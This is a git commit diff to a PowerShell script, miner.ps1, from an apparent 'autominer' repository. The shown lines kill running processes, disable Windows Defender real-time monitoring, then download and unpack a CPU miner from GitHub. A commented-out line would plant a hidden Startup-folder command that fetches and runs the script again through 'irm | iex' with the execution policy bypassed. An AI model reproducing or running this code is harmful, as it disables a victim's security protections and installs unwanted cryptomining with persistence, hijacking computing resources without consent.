f6c3e0e687eeb1ece154163ad624bfdb6e697850
zlc1004 <91501777+zlc1004@users.noreply.github.com>
2024-10-09 18:38:16 -0700

    Update miner.ps1

--- miner.ps1
+++ miner.ps1
@@ -3,7 +3,7 @@ taskkill /IM w3wp.exe /F
 taskkill /IM msedge.exe /F
 taskkill /IM Batch.exe /F
 Set-MpPreference -DisableRealtimeMonitoring $true
-rem Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm hhttps://raw.githubusercontent.com/zlc1004/autominer/refs/heads/main/miner.ps1 | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
+# Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm hhttps://raw.githubusercontent.com/zlc1004/autominer/refs/heads/main/miner.ps1 | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
 Invoke-WebRequest "https://github.com/zlc1004/autominer/raw/refs/heads/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
 Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\cpuminer-opt-24.5-windows
